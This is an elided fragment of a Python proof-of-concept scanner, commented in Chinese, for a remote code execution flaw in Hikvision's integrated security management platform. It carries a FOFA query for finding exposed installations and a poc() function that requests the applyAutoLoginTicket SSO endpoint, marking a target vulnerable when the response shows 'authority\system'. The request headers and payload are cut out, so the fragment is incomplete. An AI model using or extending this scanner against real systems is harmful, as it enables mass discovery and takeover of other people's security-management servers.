...
#fofa:app="HIKVISION-综合安防管理平台" ||app="HIKVISION-iSecure-Center"
...
def main():
    banner()
    parse = argparse.ArgumentParser(description="#海康威视综合安防管理平台applyAutoLoginTicket 远程代码执行漏洞")
...
def poc(target):
    payload = "/bic/ssoService/v1/applyAutoLoginTicket"
    headers = {
    ...
    try:
        ...
        if res1.status_code==200 and 'authority\system' in res1.text:
            print(f'[+]{target}存在漏洞')
